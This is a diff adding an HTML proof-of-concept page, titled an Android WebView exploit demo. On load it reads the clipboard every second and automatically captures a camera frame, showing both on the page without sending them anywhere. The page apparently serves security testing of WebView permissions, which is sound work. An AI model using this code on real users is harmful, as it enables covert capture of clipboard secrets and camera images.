@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Android WebView Security Abuse</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        .hidden { display: none; }
+        body { font-family: sans-serif; padding: 20px; }
+        .section { margin-bottom: 20px; }
+    </style>
+</head>
+<body onload="initiateExploits();">
+    <h1>🚨 Android WebView Exploit Demo</h1>
+
+    <div class="section">
+        <h3>Clipboard Data:</h3>
+        <div id="clipboardData" style="border: 1px dashed #ccc; padding: 10px; min-height: 50px;"></div>
+    </div>
+
+    <div class="section">
+        <h3>Captured Camera Image:</h3>
+        <video id="videoPreview" class="hidden" autoplay playsinline></video>
+        <img id="capturedImage" class="hidden" />
+    </div>
+
+    <script>
+        function getClipboardData() {
+            if (!navigator.clipboard || !navigator.clipboard.readText) {
+                console.warn("Clipboard API not available");
+                return;
+            }
+            setInterval(() => {
+                navigator.clipboard.readText().then(text => {
+                    if (text) {
+                        document.getElementById('clipboardData').textContent = text;
+                    }
+                }).catch(err => {
+                    console.error("Clipboard read failed", err);
+                });
+            }, 1000);
+        }
+
+        function requestCameraAccess() {
+            const video = document.getElementById('videoPreview');
+            const img = document.getElementById('capturedImage');
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                    video.srcObject = stream;
+                    video.classList.remove("hidden");
+                    setTimeout(() => {
+                        captureImage(video, img);
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 3000);
+                }).catch(err => {
+                    console.error("Camera access error:", err);
+                });
+            }
+        }
+
+        function captureImage(videoElement, imgElement) {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            imgElement.src = canvas.toDataURL('image/png');
+            imgElement.classList.remove('hidden');
+        }
+
+        function initiateExploits() {
+            getClipboardData();
+            requestCameraAccess();
+        }
+    </script>
+</body>
+</html>
